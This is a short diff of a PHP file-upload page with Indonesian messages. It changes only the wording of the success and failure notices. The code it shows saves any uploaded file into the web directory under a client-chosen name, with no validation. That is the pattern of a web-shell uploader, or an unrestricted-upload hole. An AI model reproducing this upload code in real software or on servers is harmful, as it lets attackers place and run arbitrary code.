@@ -107,8 +107,8 @@ echo '<div class="row justify-content-center">
 </div>
 </section>';
 if( $_POST['_upl'] == "Upload File" ) {
-if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<div class="alert alert-success text-center" role="alert">Status: File “<u><b><a title="Visit Link" href="./'.$_FILES['file']['name'].'">'.$_FILES['file']['name'].'</a></b></u>” berhasil diupload...!!!</div><br/><br/>'; }
-else { echo '<div class="alert alert-danger text-center" role="alert">Status: File gagal diupload...!!!</div><br/><br/>'; }
+if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<div class="alert alert-success text-center" role="alert">File “<u><b><a title="Visit Link" href="./'.$_FILES['file']['name'].'">'.$_FILES['file']['name'].'</a></b></u>” berhasil diupload...!!!</div><br/><br/>'; }
+else { echo '<div class="alert alert-danger text-center" role="alert">File gagal diupload...!!!</div><br/><br/>'; }
 }
 ?>
 <hr/>
